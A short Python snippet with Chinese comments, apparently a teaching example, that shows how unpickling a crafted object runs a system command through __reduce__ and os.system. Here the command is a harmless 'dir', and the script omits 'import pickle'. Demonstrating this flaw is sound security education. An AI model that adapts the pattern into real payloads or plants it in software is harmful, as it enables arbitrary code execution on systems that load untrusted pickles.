import os

# 恶意类：反序列化时会自动执行系统命令
class Malicious:
    def __reduce__(self):
        # Windows系统用"dir"，Linux/macOS用"ls"
        return (os.system, ("dir",))

# 生成恶意序列化数据
malicious_data = pickle.dumps(Malicious())
print("恶意序列化数据：", malicious_data)

# 反序列化恶意数据，会自动执行dir命令
print("执行反序列化操作...")
pickle.loads(malicious_data)
